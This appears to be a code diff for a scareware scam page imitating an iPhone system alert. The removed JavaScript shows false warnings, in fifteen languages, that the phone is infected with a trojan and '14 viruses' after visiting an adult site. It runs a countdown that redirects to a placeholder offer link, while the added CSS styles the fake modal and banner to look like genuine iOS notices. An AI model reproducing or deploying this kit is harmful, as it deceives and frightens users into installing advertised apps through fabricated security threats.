@@ -1,307 +1,602 @@
-
-document.addEventListener("DOMContentLoaded", function () {
-    const step0 = document.getElementById("step0");
-    const timerEl = document.getElementById("modal_timer_text");
-    const banner = document.querySelector('.bottom-warning');
-    const bg = document.querySelector('.screen-bg');
-  
-  if (!step0) return;
-
-    let totalSeconds = 60;
-    let timerStarted = false;
-    let switched = false;
-    let intervalId = null;
-
-  const translations = {
-    en: {
-      modal_title_key: "Your Apple iPhone is infected with trojan virus!",
-      modal_text_key: "Install the recommended mobile app immediately to ensure security.",
-      modal_cancel_key: "Cancel",
-      scan_now_option: "Install",
-      warning_title_key: "Warning!",
-      warning_time_key: "Now",
-      warning_text_key: "You may have ",
-      danger_span_key: "14 viruses",
-      warning_text_key_last: " in your iPhone’s storage after visiting an adult website!",
-      dismiss_key: "Dismiss",
-      remove_key: "Remove",
-    },
-    fr: {
-      modal_title_key: "Votre Apple iPhone est infecté par un virus trojan !",
-      modal_text_key: "Installez immédiatement l'application mobile recommandée pour garantir la sécurité.",
-      modal_cancel_key: "Annuler",
-      scan_now_option: "Installer",
-      warning_title_key: "Avertissement !",
-      warning_time_key: "Maintenant",
-      warning_text_key: "Vous pouvez avoir ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " dans le stockage de votre iPhone après avoir visité un site pour adultes !",
-      dismiss_key: "Ignorer",
-      remove_key: "Supprimer",
-    },
-    "pt-PT": {
-      modal_title_key: "O seu Apple iPhone está infetado com um vírus trojan!",
-      modal_text_key: "Instale imediatamente a aplicação móvel recomendada para garantir a segurança.",
-      modal_cancel_key: "Cancelar",
-      scan_now_option: "Instalar",
-      warning_title_key: "Aviso!",
-      warning_time_key: "Agora",
-      warning_text_key: "Pode ter ",
-      danger_span_key: "14 vírus",
-      warning_text_key_last: " no armazenamento do seu iPhone após visitar um site para adultos!",
-      dismiss_key: "Ignorar",
-      remove_key: "Remover",
-    },
-    "pt-BR": {
-      modal_title_key: "Seu Apple iPhone está infectado com um vírus trojan!",
-      modal_text_key: "Instale imediatamente o aplicativo móvel recomendado para garantir a segurança.",
-      modal_cancel_key: "Cancelar",
-      scan_now_option: "Instalar",
-      warning_title_key: "Aviso!",
-      warning_time_key: "Agora",
-      warning_text_key: "Você pode ter ",
-      danger_span_key: "14 vírus",
-      warning_text_key_last: " no armazenamento do seu iPhone após visitar um site adulto!",
-      dismiss_key: "Ignorar",
-      remove_key: "Remover",
-    },
-    es: {
-      modal_title_key: "¡Tu Apple iPhone está infectado con un virus troyano!",
-      modal_text_key: "Instala inmediatamente la aplicación móvil recomendada para garantizar la seguridad.",
-      modal_cancel_key: "Cancelar",
-      scan_now_option: "Instalar",
-      warning_title_key: "¡Advertencia!",
-      warning_time_key: "Ahora",
-      warning_text_key: "Puede que tengas ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " en el almacenamiento de tu iPhone después de visitar un sitio para adultos!",
-      dismiss_key: "Descartar",
-      remove_key: "Eliminar",
-    },
-    "es-419": {
-      modal_title_key: "¡Tu Apple iPhone está infectado con un virus troyano!",
-      modal_text_key: "Instala de inmediato la aplicación móvil recomendada para garantizar la seguridad.",
-      modal_cancel_key: "Cancelar",
-      scan_now_option: "Instalar",
-      warning_title_key: "¡Advertencia!",
-      warning_time_key: "Ahora",
-      warning_text_key: "Puede que tengas ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " en el almacenamiento de tu iPhone después de visitar un sitio para adultos!",
-      dismiss_key: "Descartar",
-      remove_key: "Eliminar",
-    },
-    da: {
-      modal_title_key: "Din Apple iPhone er inficeret med en trojansk virus!",
-      modal_text_key: "Installer straks den anbefalede mobilapp for at sikre sikkerheden.",
-      modal_cancel_key: "Annuller",
-      scan_now_option: "Installer",
-      warning_title_key: "Advarsel!",
-      warning_time_key: "Nu",
-      warning_text_key: "Du kan have ",
-      danger_span_key: "14 vira",
-      warning_text_key_last: " i din iPhones lager efter at have besøgt en sexvideo-side!",
-      dismiss_key: "Afvis",
-      remove_key: "Fjern",
-    },
-    ja: {
-      modal_title_key: "あなたのApple iPhoneはトロイの木馬ウイルスに感染しています！",
-      modal_text_key: "安全を確保するために、推奨されるモバイルアプリを直ちにインストールしてください。",
-      modal_cancel_key: "キャンセル",
-      scan_now_option: "インストール",
-      warning_title_key: "警告！",
-      warning_time_key: "今",
-      warning_text_key: "あなたのiPhoneには ",
-      danger_span_key: "14個のウイルス",
-      warning_text_key_last: " 成人向けサイトを訪問した後に保存されている可能性があります！",
-      dismiss_key: "閉じる",
-      remove_key: "削除",
-    },
-    fil: {
-      modal_title_key: "Ang iyong Apple iPhone ay nahawahan ng trojan virus!",
-      modal_text_key: "I-install agad ang inirerekomendang mobile app upang masiguro ang seguridad.",
-      modal_cancel_key: "Kanselahin",
-      scan_now_option: "I-install",
-      warning_title_key: "Babala!",
-      warning_time_key: "Ngayon",
-      warning_text_key: "Maaaring mayroon kang ",
-      danger_span_key: "14 na virus",
-      warning_text_key_last: " sa storage ng iyong iPhone matapos bumisita sa isang adult na website!",
-      dismiss_key: "I-dismiss",
-      remove_key: "Alisin",
-    },
-    de: {
-      modal_title_key: "Ihr Apple iPhone ist mit einem Trojaner-Virus infiziert!",
-      modal_text_key: "Installieren Sie sofort die empfohlene mobile App, um die Sicherheit zu gewährleisten.",
-      modal_cancel_key: "Abbrechen",
-      scan_now_option: "Installieren",
-      warning_title_key: "Warnung!",
-      warning_time_key: "Jetzt",
-      warning_text_key: "Möglicherweise haben Sie ",
-      danger_span_key: "14 Viren",
-      warning_text_key_last: " im Speicher Ihres iPhones, nachdem Sie eine Website für Erwachsene besucht haben!",
-      dismiss_key: "Verwerfen",
-      remove_key: "Entfernen",
-    },
-    nb: {
-      modal_title_key: "Din Apple iPhone er infisert med et trojansk virus!",
-      modal_text_key: "Installer umiddelbart den anbefalte mobilappen for å sikre sikkerheten.",
-      modal_cancel_key: "Avbryt",
-      scan_now_option: "Installer",
-      warning_title_key: "Advarsel!",
-      warning_time_key: "Nå",
-      warning_text_key: "Du kan ha ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " i lagringen på din iPhone etter å ha besøkt et nettsted for voksne!",
-      dismiss_key: "Avvis",
-      remove_key: "Fjern",
-    },
-    sv: {
-      modal_title_key: "Din Apple iPhone är infekterad med ett trojanskt virus!",
-      modal_text_key: "Installera omedelbart den rekommenderade mobilappen för att säkerställa säkerheten.",
-      modal_cancel_key: "Avbryt",
-      scan_now_option: "Installera",
-      warning_title_key: "Varning!",
-      warning_time_key: "Nu",
-      warning_text_key: "Du kan ha ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " i lagringen på din iPhone efter att ha besökt en webbplats för vuxna!",
-      dismiss_key: "Avfärda",
-      remove_key: "Ta bort",
-    },
-    it: {
-      modal_title_key: "Il tuo Apple iPhone è infetto da un virus trojan!",
-      modal_text_key: "Installa immediatamente l'app mobile consigliata per garantire la sicurezza.",
-      modal_cancel_key: "Annulla",
-      scan_now_option: "Installa",
-      warning_title_key: "Avviso!",
-      warning_time_key: "Ora",
-      warning_text_key: "Potresti avere ",
-      danger_span_key: "14 virus",
-      warning_text_key_last: " nella memoria del tuo iPhone dopo aver visitato un sito per adulti!",
-      dismiss_key: "Ignora",
-      remove_key: "Rimuovi",
-    },
-    nl: {
-      modal_title_key: "Je Apple iPhone is geïnfecteerd met een trojaans virus!",
-      modal_text_key: "Installeer onmiddellijk de aanbevolen mobiele app om de veiligheid te garanderen.",
-      modal_cancel_key: "Annuleren",
-      scan_now_option: "Installeren",
-      warning_title_key: "Waarschuwing!",
-      warning_time_key: "Nu",
-      warning_text_key: "Je kunt ",
-      danger_span_key: "14 virussen",
-      warning_text_key_last: " in de opslag van je iPhone hebben na het bezoeken van een website voor volwassenen!",
-      dismiss_key: "Negeren",
-      remove_key: "Verwijderen",
-    },
-    ro: {
-      modal_title_key: "Apple iPhone-ul tău este infectat cu un virus troian!",
-      modal_text_key: "Instalează imediat aplicația mobilă recomandată pentru a asigura securitatea.",
-      modal_cancel_key: "Anulează",
-      scan_now_option: "Instalează",
-      warning_title_key: "Avertisment!",
-      warning_time_key: "Acum",
-      warning_text_key: "Este posibil să ai ",
-      danger_span_key: "14 viruși",
-      warning_text_key_last: " în stocarea iPhone-ului tău după ce ai vizitat un site pentru adulți!",
-      dismiss_key: "Respinge",
-      remove_key: "Elimină",
-    },
-  };
-
-  const definedLanguages = [
-    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
-    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
-  ];
-
-  const currentLocale = (navigator && navigator.language) || "en";
-
-  const getLocale = () => {
-    if (translations[currentLocale]) return currentLocale;
-
-    const shortLocale = currentLocale.slice(0, 2);
-    if (translations[shortLocale]) return shortLocale;
-
-    return "en";
-  };
-
-  const locale = getLocale();
-  const t = translations[locale] || translations.en;
-
-  document.documentElement.lang = locale;
-
-  document.getElementById("modal_title_key").textContent = t.modal_title_key;
-  document.getElementById("modal_text_key").textContent = t.modal_text_key;
-  document.getElementById("modal_cancel_key").textContent = t.modal_cancel_key;
-  document.getElementById("scan_now_option").textContent = t.scan_now_option;
-  document.getElementById("warning_title_key").textContent = t.warning_title_key;
-  document.getElementById("warning_time_key").textContent = t.warning_time_key;
-  document.getElementById("warning_text_key").textContent = t.warning_text_key;
-  document.getElementById("danger_span_key").textContent = t.danger_span_key;
-  document.getElementById("warning_text_key_last").textContent = t.warning_text_key_last;
-  document.getElementById("dismiss_key").textContent = t.dismiss_key;
-  document.getElementById("remove_key").textContent = t.remove_key;
-
-    function showStep(step) {
-        step0.classList.remove("active");
-
-        step.classList.add("active");
-    }
-
-    function renderTimer() {
-        if (!timerEl) return;
-
-        const minutes = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
-        const seconds = String(totalSeconds % 60).padStart(2, "0");
-        timerEl.textContent = `${minutes}:${seconds}`;
-    }
-
-    function startTimer() {
-        if (timerStarted) return;
-        timerStarted = true;
-
-        renderTimer();
-
-         intervalId = setInterval(function () {
-            if (totalSeconds <= 0) {
-                clearInterval(intervalId);
-                window.location.href = "{offer}";
-                return;
-            }
-
-            totalSeconds -= 1;
-            renderTimer();
-        }, 1000);
-    }
-
-    showStep(step0);
-
-    step0.addEventListener("click", function () {
-        window.location.href = "{offer}";
-    });
-
-    if (timerEl) {
-        renderTimer();
-
-        setTimeout(function () {
-            startTimer();
-        }, 1550);
-    }
-
-if (banner && bg) {
-    banner.addEventListener('animationend', () => {
-        bg.classList.add('active');
-    });
+html,
+body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    min-height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+    background: #000;
+    color: #fff;
+    overflow-x: hidden;
 }
-  
-(function () {
-  const ua = navigator.userAgent;
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-  const isChrome = /CriOS/i.test(ua);
 
-  if (isIOS && isChrome) {
-    document.body.classList.add('ios-chrome');
-  }
-})();
-});
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+
+a,
+button {
+    -webkit-tap-highlight-color: transparent;
+}
+
+button {
+    font: inherit;
+    border: 0;
+    background: none;
+    padding: 0;
+    margin: 0;
+}
+
+img {
+    display: block;
+    max-width: 100%;
+}
+
+.screen {
+    min-height: 100svh;
+    min-height: 100vh;
+    display: flex;
+    align-items: stretch;
+    justify-content: center;
+    background:
+        radial-gradient(circle at top, rgba(255, 255, 255, 0.06), transparent 32%),
+        linear-gradient(180deg, #050505 0%, #0a0a0a 50%, #000000 100%);
+}
+
+.iphone-frame {
+    position: relative;
+    width: 100%;
+    min-height: 100svh;
+    min-height: 100vh;
+    overflow: hidden;
+    background: #000;
+    padding:
+        max(14px, env(safe-area-inset-top))
+        14px
+        max(100px, env(safe-area-inset-bottom))
+        14px;
+}
+
+.screen-bg {
+    position: absolute;
+    inset: 0;
+    z-index: 0;
+    overflow: hidden;
+}
+
+.screen-bg::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.3);
+    opacity: 0;                
+    transition: opacity 0.3s ease;
+    z-index: 2;
+}
+
+.screen-bg.active::before {
+    opacity: 1;
+}
+
+.bg-image-slot {
+    position: absolute;
+    inset: 0;
+    z-index: 1;
+    background-image: url("../img/home-screen.webp");
+    background-repeat: no-repeat;
+    background-position: center top;
+    background-size: cover;
+}
+
+/* TOP ALERT */
+
+.fake-modal {
+    position: relative;
+    z-index: 3;
+    width: min(100%, 398px);
+    margin: clamp(20px, 2.8vh, 28px) auto 0;
+    padding: 18px 18px 0;
+    border-radius: 34px;
+    background: #E4E4E4;
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+    box-shadow:
+        0 18px 40px rgba(0, 0, 0, 0.22),
+        0 1px 0 rgba(255, 255, 255, 0.72) inset;
+    text-align: center;
+    overflow: hidden;
+}
+
+.fake-modal__icon-wrap {
+    position: relative;
+    width: 112px;
+    height: 112px;
+    margin: 0 auto 14px;
+}
+
+.fake-modal__icon-slot {
+    width: 112px;
+    height: 112px;
+    border-radius: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+}
+
+.fake-modal__icon-slot img {
+    width: 75%;
+    height: 75%;
+    object-fit: contain;
+}
+
+.fake-modal__badge {
+    position: absolute;
+    right: 8px;
+    top: 8px;
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: #ff3b30;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 700;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.16);
+}
+
+.fake-modal__timer {
+    font-size: 20px;
+    line-height: 1;
+    font-weight: 700;
+    letter-spacing: -0.04em;
+    margin-bottom: 16px;
+    color: #ff3b30;
+}
+
+.fake-modal__title {
+    margin: 0 auto 18px;
+    max-width: 340px;
+    font-size: clamp(20px, 5.7vw, 34px);
+    line-height: 1.4;
+    font-weight: 700;
+    letter-spacing: -0.001em;
+    color: #111111;
+}
+
+.fake-modal__text {
+    margin: 0 auto 28px;
+    max-width: 330px;
+    font-size: clamp(16px, 3.9vw, 22px);
+    line-height: 1.28;
+    letter-spacing: -0.02em;
+    color: #3a3a3c;
+}
+
+.fake-modal__actions {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0;
+    border-top: 1px solid rgba(60, 60, 67, 0.18);
+    margin: 0 -18px;
+}
+
+.fake-modal__btn {
+    min-height: 80px;
+    border-radius: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    font-size: 28px;
+    font-weight: 600;
+    letter-spacing: -0.03em;
+    transition: transform 0.18s ease, opacity 0.18s ease;
+}
+
+.fake-modal__btn:active {
+    transform: scale(0.985);
+}
+
+.fake-modal__btn--cancel {
+    background: transparent;
+    color: #ff3b30;
+    border-right: 1px solid rgba(60, 60, 67, 0.18);
+}
+
+.fake-modal__btn--install {
+    background: transparent;
+    color: #2563ff;
+    font-weight: 600;
+}
+
+.bottom-warning {
+    position: fixed;
+    left: 12px;
+    right: 12px;
+    bottom: calc(env(safe-area-inset-bottom, 0px) + 12px);
+    z-index: 3;
+    padding: 20px 16px 0;
+    border-radius: 26px;
+    background: linear-gradient(180deg, #1c1c1e 0%, #111113 100%);
+    box-shadow:none;
+    overflow: hidden;
+}
+
+.bottom-warning__top {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+}
+
+.bottom-warning__icon {
+    flex: 0 0 26px;
+    width: 26px;
+    height: 26px;
+    margin-top: 2px;
+    margin-left: 13px;
+}
+
+.bottom-warning__icon img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    transform: scale(2);
+}
+
+.bottom-warning__content {
+    min-width: 0;
+    flex: 1 1 auto;
+    padding-left: 10px;
+    transform: translateX(2px);
+}
+
+.bottom-warning__title-row {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    gap: 8px;
+    margin-bottom: 6px;
+}
+
+.bottom-warning__title {
+    margin: 0;
+    font-size: 18px;
+    line-height: 1.2;
+    font-weight: 700;
+    color: #ffffff;
+}
+
+.bottom-warning__time {
+    color: rgba(255, 255, 255, 0.5);
+    font-size: 14px;
+    line-height: 1.2;
+}
+
+.bottom-warning__text {
+    max-width: 100%;
+    margin: 0;
+    font-size: 14px;
+    line-height: 1.35;
+    letter-spacing: -0.01em;
+    color: rgba(255, 255, 255, 0.75);
+}
+
+.bottom-warning__actions {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    margin-top: 22px;
+    border-top: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.bottom-warning__btn {
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 17px;
+    font-weight: 500;
+    text-decoration: none;
+    transition: transform 0.18s ease, opacity 0.18s ease;
+}
+
+.bottom-warning__btn:active {
+    transform: scale(0.985);
+}
+
+.bottom-warning__btn--dismiss {
+    color: rgba(255, 255, 255, 0.6);
+    border-right: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.bottom-warning__btn--remove {
+    color: #30d158;
+    font-weight: 600;
+}
+
+.danger {
+    color: #ff3b30;
+    font-weight: 600;
+}
+
+@media (max-width: 390px) {
+    .fake-modal {
+        width: 100%;
+        margin-top: 14px;
+        padding: 16px 16px 0;
+        border-radius: 30px;
+    }
+
+    .fake-modal__icon-wrap {
+        width: 102px;
+        height: 102px;
+        margin-bottom: 12px;
+    }
+
+    .fake-modal__icon-slot {
+        width: 102px;
+        height: 102px;
+        border-radius: 24px;
+    }
+
+    .fake-modal__badge {
+        width: 18px;
+        height: 18px;
+        font-size: 13px;
+    }
+
+    .fake-modal__timer {
+        font-size: 20px;
+        margin-bottom: 14px;
+    }
+
+    .fake-modal__title {
+        font-size: 23px;
+        margin-bottom: 16px;
+        max-width: 320px;
+    }
+
+    .fake-modal__text {
+        font-size: 14px;
+        margin-bottom: 22px;
+        max-width: 300px;
+    }
+
+    .fake-modal__btn {
+        min-height: 72px;
+        font-size: 24px;
+    }
+
+    .bottom-warning {
+        left: 10px;
+        right: 10px;
+        padding: 16px 13px 0;
+        border-radius: 22px;
+    }
+
+    .bottom-warning__top {
+        gap: 16px;
+    }
+
+    .bottom-warning__content {
+        padding-left: 8px;
+        transform: translateX(1px);
+    }
+    
+        .bottom-warning {
+        bottom: calc(env(safe-area-inset-bottom, 0px) + 10px);
+    }
+}
+
+@media (max-width: 375px) {
+.fake-modal__badge {
+    
+    right: 5px;
+    top: 5px;
+    width: 16px;
+    height: 16px;
+    }
+    
+    .iphone-frame {
+        padding-left: 10px;
+        padding-right: 10px;
+    }
+
+    .fake-modal {
+        margin-top: 12px;
+        padding: 15px 14px 0;
+        border-radius: 28px;
+    }
+
+    .fake-modal__icon-wrap {
+        width: 80px;
+        height: 80px;
+    }
+
+    .fake-modal__icon-slot {
+        width: 80px;
+        height: 80px;
+        border-radius: 22px;
+    }
+
+    .fake-modal__timer {
+        font-size: 20px;
+        margin-bottom: 12px;
+    }
+
+    .fake-modal__title {
+        font-size: 19px;
+        max-width: 290px;
+        margin-bottom: 14px;
+    }
+
+    .fake-modal__text {
+        font-size: 14px;
+        max-width: 286px;
+        margin-bottom: 20px;
+    }
+
+    .fake-modal__btn {
+        min-height: 55px;
+        font-size: 21px;
+    }
+
+    .bottom-warning__text {
+        font-size: 12px;
+    }
+    
+    .bottom-warning {
+        bottom: calc(env(safe-area-inset-bottom, 0px) + 10px);
+    }
+}
+
+@media (max-width: 320px) {
+    .iphone-frame {
+        padding-left: 8px;
+        padding-right: 8px;
+    }
+
+    .fake-modal {
+        margin-top: 10px;
+        padding: 14px 12px 0;
+        border-radius: 24px;
+    }
+
+    .fake-modal__icon-wrap {
+        width: 82px;
+        height: 82px;
+        margin-bottom: 10px;
+    }
+
+    .fake-modal__icon-slot {
+        width: 82px;
+        height: 82px;
+        border-radius: 20px;
+    }
+
+    .fake-modal__badge {
+        width: 26px;
+        height: 26px;
+        font-size: 15px;
+    }
+
+    .fake-modal__timer {
+        font-size: 28px;
+        margin-bottom: 10px;
+    }
+
+    .fake-modal__title {
+        font-size: 22px;
+        margin-bottom: 12px;
+        max-width: 260px;
+    }
+
+    .fake-modal__text {
+        max-width: 100%;
+        font-size: 14px;
+        line-height: 1.3;
+        margin-bottom: 18px;
+    }
+
+    .fake-modal__btn {
+        min-height: 58px;
+        font-size: 18px;
+    }
+
+    .bottom-warning {
+        left: 8px;
+        right: 8px;
+        padding: 14px 12px 0;
+        border-radius: 20px;
+    }
+
+    .bottom-warning__top {
+        gap: 12px;
+    }
+
+    .bottom-warning__content {
+        padding-left: 4px;
+        transform: none;
+    }
+
+    .bottom-warning__title {
+        font-size: 16px;
+    }
+
+    .bottom-warning__time {
+        font-size: 12px;
+    }
+
+    .bottom-warning__text {
+        font-size: 10px;
+        line-height: 1.3;
+    }
+
+    .bottom-warning__actions {
+        margin-top: 16px;
+    }
+
+    .bottom-warning__btn {
+        height: 48px;
+        font-size: 15px;
+    }
+}
+
+@media (min-width: 414px) {
+    .fake-modal {
+        width: min(100%, 414px);
+    }
+
+    .bottom-warning {
+        left: 16px;
+        right: 16px;
+    }
+    
+    .fake-modal__title {
+        font-size: 23px;
+        margin-bottom: 16px;
+        max-width: 320px;
+    }
+    
+        .bottom-warning {
+        bottom: calc(env(safe-area-inset-bottom, 0px) + 10px);
+    }
+}
+
+@media (min-height: 668px) {
+    .fake-modal {
+        margin-top: 26px;
+    }
+
+
+}
+
+.ios-chrome .bottom-warning {
+    bottom: calc(env(safe-area-inset-bottom, 0px) + 20px);
+}
+
+.bottom-warning {
+    transform: translateY(140%);
+    opacity: 0;
+    animation: bannerSlideUp 0.55s ease-out 1s forwards;
+}
+
+@keyframes bannerSlideUp {
+    from {
+        transform: translateY(140%);
+        opacity: 0;
+    }
+    to {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+
+
+
+
